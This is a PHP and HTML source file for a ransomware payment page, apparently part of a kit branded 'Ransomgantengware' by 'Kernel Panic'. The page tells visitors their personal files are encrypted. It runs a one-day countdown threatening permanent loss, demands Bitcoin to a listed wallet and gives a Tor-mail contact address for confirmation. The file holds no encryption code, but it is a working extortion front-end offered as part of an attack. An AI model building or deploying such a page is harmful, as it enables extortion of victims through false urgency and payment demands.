<?php

$user_ip = $_SERVER['REMOTE_ADDR'];

//If was real check the UUID against database and get status and time left.

date_default_timezone_set("Asia/Jakarta");

 ?>

 <!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">

     <title>Pwned! Kernel Panic was here..</title>

     <link href="css/bootstrap.min.css" rel="stylesheet">
     <link href="css/style.css" rel="stylesheet">

   </head>

   <!-- JS Timer from http://stackoverflow.com/questions/9335140/how-to-countdown-to-a-date -->
   <script>
   <?php
   $startDate = time();
   $newDate = date('m/d/y  g:i A', strtotime('+1 day', $startDate));

    ?>
var end = new Date('<?php echo $newDate; ?>');

    var _second = 1000;
    var _minute = _second * 60;
    var _hour = _minute * 60;
    var _day = _hour * 24;
    var timer;

    function showRemaining() {
        var now = new Date();
        var distance = end - now;
        if (distance < 0) {

            clearInterval(timer);
            document.getElementById('countdown').innerHTML = 'EXPIRED!';

            return;
        }
        var days = Math.floor(distance / _day);
        var hours = Math.floor((distance % _day) / _hour);
        var minutes = Math.floor((distance % _hour) / _minute);
        var seconds = Math.floor((distance % _minute) / _second);

        document.getElementById('countdown').innerHTML = days + 'days ';
        document.getElementById('countdown').innerHTML += hours + 'hrs ';
        document.getElementById('countdown').innerHTML += minutes + 'mins ';
        document.getElementById('countdown').innerHTML += seconds + 'secs';
    }

    timer = setInterval(showRemaining, 1000);
</script>

   <body>

     <div class="container-fluid">
 	<div class="row">
 		<div class="col-md-12">
 			<div class="page-header">
 				<h1 align="center">
 					Ransomgantengware! <br><small>Your personal files have been encrypted!</small>
 				</h1>
 			</div>
 			<div class="jumbotron">
 				<h2>
 					Files to be lost forever in <strong><div id="countdown"></div></strong>
 				</h2>
 				<p>
 					To get your files back please send 0.04706 Bitcoins (Rp.500,000) to the following Bitcoin wallet: <strong>1JSijAyB1Q3rgu7dUMvjYoo3viEqBoisot</strong>
 				</p>
 				<p>
 					<a class="btn btn-primary btn-large" href="http://lmgtfy.com/?q=how+to+buy+bitcoins#seen">Help With Buying Bitcoins</a>
 				</p>
 			</div>
 			<h4 align="center">
 				As soon as your payment has been sent, <a href="mailto:kernel_panic@mail2tor.com" target="_blank">contact us for confirmation,</a> then refresh this page and download our free file restoration tool.
 			</h4>
			<div align="center">Lock with <img class="vertical-middle" src="https://imagizer.imageshack.us/a/img924/5222/GPPNSo.png" height="10" width="10" alt=""> in Indonesia.</div>
 		</div>
 	</div>
 </div>

     <script src="js/jquery.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
     <script src="js/scripts.js"></script>


   </body>
 </html>
		